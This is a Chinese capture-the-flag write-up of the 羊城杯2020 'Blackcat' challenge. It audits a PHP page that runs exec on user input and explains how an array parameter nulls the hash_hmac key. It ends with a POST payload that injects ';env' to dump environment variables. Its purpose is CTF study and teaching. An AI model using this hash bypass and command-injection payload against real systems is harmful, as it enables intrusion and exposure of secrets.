---
title: 羊城杯2020-Blackcat
date: 2025-05-23 20:50:09
tags:
- 代码审计
- RCE
- 环境变量
- hash_hmac绕过
category:
- 刷题笔记
---

# 羊城杯2020-Blackcat

参考博客：https://blog.csdn.net/2401_86760082/article/details/145355526

https://blog.csdn.net/2202_75361164/article/details/134793656?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-134793656-blog-145355526.235^v43^pc_blog_bottom_relevance_base4&spm=1001.2101.3001.4242.2&utm_relevant_index=3

首先打开网页。

网页没什么东西，去看看源码。是一个压缩包，源码在index.php里，所以开始代码审计

```
<?php
// 检查 $_POST 数组中 'Black-Cat-Sheriff' 和 'One-ear' 这两个键对应的值是否为空
// empty() 函数用于检查一个变量是否为空，为空的情况包括变量未定义、值为 0、空字符串、空数组等
if(empty($_POST['Black-Cat-Sheriff']) || empty($_POST['One-ear'])){
    // 如果 'Black-Cat-Sheriff' 或 'One-ear' 为空，则输出错误信息并终止脚本执行
    die('谁！竟敢踩我一只耳的尾巴！');
}
 
// 使用 getenv() 函数获取名为 'clandestine' 的环境变量的值，并将其赋值给变量 $clandestine
// 环境变量通常用于存储系统或应用程序的配置信息
$clandestine = getenv("clandestine");
 
// 检查 $_POST 数组中是否存在 'White-cat-monitor' 这个键
if(isset($_POST['White-cat-monitor']))
    // 如果存在 'White-cat-monitor' 键，则使用 hash_hmac() 函数对其进行哈希处理
    // hash_hmac() 函数使用指定的哈希算法（这里是 'sha256'）和密钥（$clandestine）对数据进行哈希运算
    // 并将结果重新赋值给 $clandestine 变量
    $clandestine = hash_hmac('sha256', $_POST['White-cat-monitor'], $clandestine);
 
// 使用 hash_hmac() 函数对 $_POST['One-ear'] 的值进行哈希处理，使用 $clandestine 作为密钥
// 并将哈希结果赋值给变量 $hh
$hh = hash_hmac('sha256', $_POST['One-ear'], $clandestine);
 
// 比较 $hh（计算得到的哈希值）和 $_POST['Black-Cat-Sheriff'] 的值是否不相等
if($hh !== $_POST['Black-Cat-Sheriff']){
    // 如果不相等，则输出错误信息并终止脚本执行
    die('有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。');
}
 
// 如果前面的条件都满足，说明验证通过
// 使用 exec() 函数执行系统命令，这里尝试执行 "nc" 命令并拼接上 $_POST['One-ear'] 的值
// 这意味着 $_POST['One-ear'] 的值会作为命令的一部分被执行，存在严重的安全风险
echo exec("nc".$_POST['One-ear']);
?>
```

先看看这里

```
 // 使用 hash_hmac() 函数对 $_POST['One-ear'] 的值进行哈希处理，使用 $clandestine 作为密钥
// 并将哈希结果赋值给变量 $hh
$hh = hash_hmac('sha256', $_POST['One-ear'], $clandestine);
 
// 比较 $hh（计算得到的哈希值）和 $_POST['Black-Cat-Sheriff'] 的值是否不相等
```

思路：

首先需要POST参数`Black-Cat-Sheriff`和`One-ear`;

`getnev()`从环境中取字符串，获取环境变量的内容;

然后POST参数`White-cat-monitor`，并且`HMAC算法`生成哈希值，调用两次;

最后判断生成的哈希值与`Black-Cat-Sheriff`是否相等;

`One-ear`需要去获取`flag`的内容;

---

#### hash_hmac

hash_hmac — 使用 HMAC 方法生成带有密钥的散列值

```
 hash_hmac(
  string `$algo`,#加密的类型
  string `$data`,#要加密的值
  string `$key`,#加密时使用的密钥
  bool `$binary` = `false`#前三个参数是必须的，这个是可选的参数
): string
```

```
参数
algo
​ 要使用的散列算法名称，例如：“md5”、“sha256”、“haval160,4”等。如何获取受支持的算法清单，请参见 hash_hmac_algos() 函数。
data
​ 要进行散列运算的消息。
key
​ 使用 HMAC 生成信息摘要时所使用的密钥。
binary
​ 设置为 true 输出原始二进制数据，设置为 false 输出小写 16 进制字符串。
```

利用sha不能加密数组的特点，**返回的其实是NULL**，举例

```
<?php
$hmac = hash_hmac('sha256', Array(), "SecretKey");
echo $hmac == false;#1
echo $hmac == NULL;#1
echo $hmac == '';#1
echo $hmac === NULL;#1,只有NULL才强等于
// echo hash_hmac('sha256',';env',false)
?>

```

所以令`$_POST['White-cat-monitor']`为数组，得到的密钥就变成了NULL，加密`$_POST['One-ear']`的值变得可控

尝试了/flag

所以：

[php在线运行,在线工具，在线编译IDE_w3cschool](https://www.w3cschool.cn/tryrun/runcode?lang=php)

```
<?php
var_dump(hash_hmac('sha256', ";env", NULL));
 

?>
```

这里的发现flag在环境变量中所以构造命令`;env`

得到

```
afd556602cf62addfe4132a81b2d62b9db1b6719f83e16cce13f51960f56791b
```

最后构造payload：

```
POST：

White-cat-monitor[]=1&Black-Cat-Sheriff=afd556602cf62addfe4132a81b2d62b9db1b6719f83e16cce13f51960f56791b&One-ear=;env
```





